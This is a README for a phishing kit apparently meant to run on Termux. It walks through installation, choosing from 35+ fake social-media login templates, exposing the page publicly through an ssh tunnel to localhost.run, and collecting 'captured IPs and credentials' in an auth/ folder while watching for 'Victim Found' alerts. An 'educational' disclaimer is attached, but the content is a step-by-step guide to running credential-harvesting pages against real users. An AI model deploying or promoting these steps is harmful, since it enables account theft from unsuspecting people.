This framework is a Python-based security research tool designed to demonstrate phishing workflows. It automates local PHP server deployment and monitors data capture in real-time.
​[!CAUTION]
LEGAL DISCLAIMER: This tool is for educational purposes and authorized security testing only. Using this tool for unauthorized access to accounts is a violation of international laws.


​## 📥 Installation for Termux
​Copy and paste these commands into your Termux terminal to set up the environment:


# Update packages
pkg update && pkg upgrade -y

# Install dependencies
pkg install python php curl git -y

# (Optional) If you haven't cloned it yet
# git clone https://github.com/trackbeatz/phish.git
# cd phish 

# Run the engine
python track-fish.py

## 🚀 Features
​Multi-Platform: Support for 35+ social media and tech login templates.
​Auto-Logger: Saves captured IPs and credentials directly into the auth/ folder.
​Process Management: Automatically kills conflicting PHP sessions on startup.
​Lightweight: Optimized to run smoothly on mobile devices via Termux.
​## 🛠 How to Use
​Launch: Run track-fish.py

​Select: Choose the number corresponding to the platform you want to test (e.g., 02 for Instagram).
​Local Host: The server will start on 127.0.0.1:8080.
​Internet Access: To test outside your local network, you must open a second session in Termux and use a tunnel like Cloudflared or Ngrok:
​Example: ssh -R 80:localhost:8080 nokey@localhost.run
​Monitor: Watch the main terminal window for real-time "Victim Found" notifications.

​## 📁 Directory Map


Path Description
.sites/ Source templates (HTML/PHP)
.server/www/ Active hosting directory
auth/ Logs folder (Check here for captured data)
track-fish.py The core Python engine

## ⚠️ Troubleshooting
​PHP Error: If the server fails to start, ensure you ran pkg install php.
​Permission Denied: If the script cannot create folders, run termux-setup-storage and grant permissions.
​Clean Exit: Always use Ctrl+C to stop the script; this triggers the setup_env() function to clean up background processes.
​Developed for Security Research & Educational Awareness.
